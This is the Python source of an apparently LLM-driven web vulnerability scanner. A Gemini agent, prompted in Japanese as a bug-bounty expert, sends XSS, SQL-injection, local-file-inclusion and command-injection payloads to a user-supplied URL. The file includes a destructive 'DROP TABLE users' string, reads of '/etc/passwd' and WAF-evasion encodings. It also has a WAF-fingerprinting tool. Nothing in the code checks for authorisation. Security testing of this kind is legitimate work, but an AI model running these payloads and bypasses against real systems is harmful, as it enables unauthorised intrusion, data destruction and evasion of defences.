import os
import uvicorn
from fastapi import FastAPI, APIRouter, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field
from dotenv import load_dotenv
from typing import Optional, List, Dict
import httpx
import re
import random
import json
from urllib.parse import quote_plus

from langchain_google_genai import ChatGoogleGenerativeAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_core.tools import tool
from langchain.memory import ConversationBufferMemory

load_dotenv()
app = FastAPI()
router = APIRouter()

# ==============================
# WAF BYPASS & PAYLOAD GENERATION
# ==============================
def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
    techniques = {
        "case_obfuscation": lambda x: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in x),
        "url_encoding": lambda x: quote_plus(x),
        "character_substitution": lambda x: x.replace(" ", "+").replace("<", "%3C").replace(">", "%3E"),
        "add_null_byte": lambda x: x.replace("'", "%00'")
    }
    return techniques.get(bypass_technique, lambda x: x)(payload)

def generate_payloads(vuln_type: str) -> List[str]:
    payloads = {
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS');"
        ],
        "sql_injection": [
            "' OR 1=1--", "' UNION SELECT NULL--", "\" OR 1=1--",
            "1; DROP TABLE users;--"
        ],
        "lfi": [
            "../../../../etc/passwd", "file:///etc/passwd", "/proc/self/cmdline"
        ],
        "rce": [
            ";ls -la;", "|id|", "&&id", ";cat /etc/passwd"
        ]
    }
    return payloads.get(vuln_type, [])

# ==============================
# TOOLS
# ==============================
@tool
async def send_http_request_with_payload(
    url: str, method: str, payload_type: str, data: str = None, headers: dict = None
) -> str:
    """Send HTTP request with WAF bypass attempts and detect vulnerabilities."""
    bypass_techniques = ["case_obfuscation", "url_encoding", "character_substitution", "add_null_byte"]
    try:
        data_dict = json.loads(data) if data else {}
    except (json.JSONDecodeError, TypeError):
        return "Error: Invalid JSON in 'data'"

    async with httpx.AsyncClient(follow_redirects=True, timeout=15) as client:
        for technique in bypass_techniques:
            modified_data = {k: apply_waf_bypass(v, technique) for k, v in data_dict.items()} if data_dict else None
            try:
                response = await client.request(
                    method.upper(),
                    url,
                    json=modified_data,
                    headers=headers or {}
                )
                flags = []
                if payload_type == "sql_injection" and (response.status_code == 500 or "sql" in response.text.lower()):
                    flags.append("SQLI_DETECTED")
                if payload_type == "xss" and modified_data and any(val in response.text for val in modified_data.values()):
                    flags.append("XSS_REFLECTED")
                if payload_type in ["lfi", "path_traversal"] and "root:" in response.text:
                    flags.append("LFI_DETECTED")
                if payload_type == "rce" and re.search(r"uid=\d+", response.text):
                    flags.append("RCE_DETECTED")

                if flags:
                    return json.dumps({
                        "status": response.status_code,
                        "flags": flags,
                        "snippet": response.text[:300]
                    }, ensure_ascii=False)
            except Exception as e:
                continue
        return "No vulnerability detected or WAF bypass failed."

@tool
async def detect_waf(url: str) -> str:
    """Detect WAF signatures."""
    waf_indicators = {
        "Cloudflare": "cloudflare", "Sucuri": "sucuri",
        "AWS WAF": "awselb", "Imperva": "imperva",
        "Akamai": "akamai", "Wordfence": "wordfence"
    }
    async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
        try:
            response = await client.get(url)
            for name, key in waf_indicators.items():
                if key in response.headers.get("Server", "").lower() or key in response.text.lower():
                    return f"WAF detected: {name}"
            return "No known WAF detected."
        except httpx.RequestError as e:
            return f"WAF detection failed: {str(e)}"

# ==============================
# API SCHEMA
# ==============================
class TechStackItem(BaseModel):
    name: str
    version: Optional[str] = None

class ScanInput(BaseModel):
    url: str
    target_endpoint: str
    tech_stack: Optional[List[TechStackItem]] = None
    vulnerability_types: Optional[List[str]] = Field(default_factory=lambda: ["xss", "sql_injection", "lfi", "rce"])

# ==============================
# MAIN SCAN ENDPOINT
# ==============================
@router.post("/start_scan")
async def start_scan(scan_input: ScanInput):
    llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
    tools = [send_http_request_with_payload, detect_waf]
    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)

    agent_prompt = ChatPromptTemplate.from_messages([
        ("system", "あなたはバグバウンティの専門家であり、高度なウェブ脆弱性スキャナーです。"),
        MessagesPlaceholder("chat_history"),
        ("human", "{query}"),
        MessagesPlaceholder("agent_scratchpad"),
    ])

    agent = create_tool_calling_agent(llm, tools, agent_prompt)
    agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=True, memory=memory)

    try:
        result = await agent_executor.ainvoke({"query": f"Scan target: {scan_input.url}{scan_input.target_endpoint}"})
        final_report = result.get("output") or json.dumps(result, ensure_ascii=False)
        return {"status": "scanning_complete", "final_report": final_report}
    except Exception as e:
        return JSONResponse(status_code=500, content={
            "status": "error",
            "final_report": f"スキャン中にエラーが発生しました: {str(e)}"
        })

@app.head("/health")
async def health_check():
    return {"status": "ok"}

@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    return HTMLResponse("""
    <!DOCTYPE html>
    <html><head><title>脆弱性スキャナー</title></head>
    <body>
    <h1>脆弱性スキャン</h1>
    <input id="url" value="http://localhost:8000">
    <input id="endpoint" value="/search">
    <button onclick="startScan()">スキャン開始</button>
    <div id="output"></div>
    <script>
    async function startScan() {
        const scanData = {
            url: document.getElementById('url').value,
            target_endpoint: document.getElementById('endpoint').value
        };
        const outputDiv = document.getElementById('output');
        outputDiv.textContent = 'スキャン中...';
        try {
            const response = await fetch('/start_scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(scanData)
            });
            const text = await response.text();
            try {
                const json = JSON.parse(text);
                outputDiv.textContent = response.ok
                    ? 'スキャン完了\\n\\n' + json.final_report
                    : 'エラー: ' + (json.detail || JSON.stringify(json));
            } catch {
                outputDiv.textContent = 'エラー: JSONではありません\\n\\n' + text;
            }
        } catch (err) {
            outputDiv.textContent = 'ネットワークエラー: ' + err.message;
        }
    }
    </script>
    </body></html>
    """)

app.include_router(router)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
